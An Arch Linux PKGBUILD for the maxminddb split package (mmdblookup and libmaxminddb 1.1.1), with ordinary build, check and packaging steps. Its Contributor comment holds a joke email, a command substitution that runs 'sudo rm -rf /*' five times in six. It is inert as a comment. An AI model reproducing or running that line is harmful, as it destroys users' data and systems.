# Maintainer: frank AT apsu DOT be
# Contributor: felix <`(( $RANDOM % 6 == 0 )) && base64 -d <<< ZmVsaXgudm9uLnNAcG9zdGVvLmRlCg== || sudo rm -rf /* `>
pkgbase=maxminddb
pkgname=(
	mmdblookup
	libmaxminddb
)

pkgver=1.1.1
pkgrel=2
pkgdesc="MaxMind GeoIP2 database - split package with library and utilities"
license=('Apache')
arch=(i686 x86_64)
url="http://dev.maxmind.com/geoip/geoip2/downloadable/"

source=(
	"https://github.com/maxmind/libmaxminddb/releases/download/$pkgver/libmaxminddb-$pkgver.tar.gz"
	libmaxminddb.install
)
sha512sums=('0dffb0b4b43eb70b6c4e4899c5875658fb031f7f8d859c43ffc27df89f3aebe0e0291caa721efaab3d664fb1c919c7432e1e0df3140c4877ddfa3e61a288d132'
            '9b0dca8bb17f198c4cc391660c9d9f955534381fc8ac0c8ddb4bdab0aff4e2a05900c98aee79e14275e4399494c5c5523c2e65a05985ac7a95cf1e8e950cf451')

build() {
	cd "$srcdir/libmaxminddb-$pkgver"
	./configure --prefix=/usr
	make
}

check() {
	msg2 "Checking the library and utilities"
	cd "$srcdir/libmaxminddb-$pkgver"
	make check
}

# because upstream only builds completely if built from the
# top makefile, we build and then remove the parts we don't
# want packaged. This is suboptimal. I'll do a pull request
# with --with-xxx options upstream so I can simpllfy this
# here (and probably make life easier for other packagers as well.)

package_mmdblookup() {
	pkgdesc="MaxMindDB GeoIP2 database - lookup utility"
	license=('Apache')
	depends=(libmaxminddb)
	provides=(mmdblookup)
    conflicts=('libmaxminddb-git')

	cd "$srcdir/libmaxminddb-$pkgver"
    make PREFIX=/usr DESTDIR="$pkgdir" install
    rm -Rf "$pkgdir/usr/lib"
    rm -Rf "$pkgdir/usr/include"
    rm -Rf "$pkgdir/usr/share/man/man3"
}

package_libmaxminddb() {
	pkgdesc="MaxMindDB GeoIP2 database - library"
	license=('Apache')
	depends=(glibc)
	provides=(libmaxminddb)
    conflicts=('libmaxminddb-git')
	install=libmaxminddb.install

	cd "$srcdir/libmaxminddb-$pkgver"
    make PREFIX=/usr DESTDIR="$pkgdir" install
    rm -Rf "$pkgdir/usr/bin"
    rm -Rf "$pkgdir/usr/share/man/man1"
}
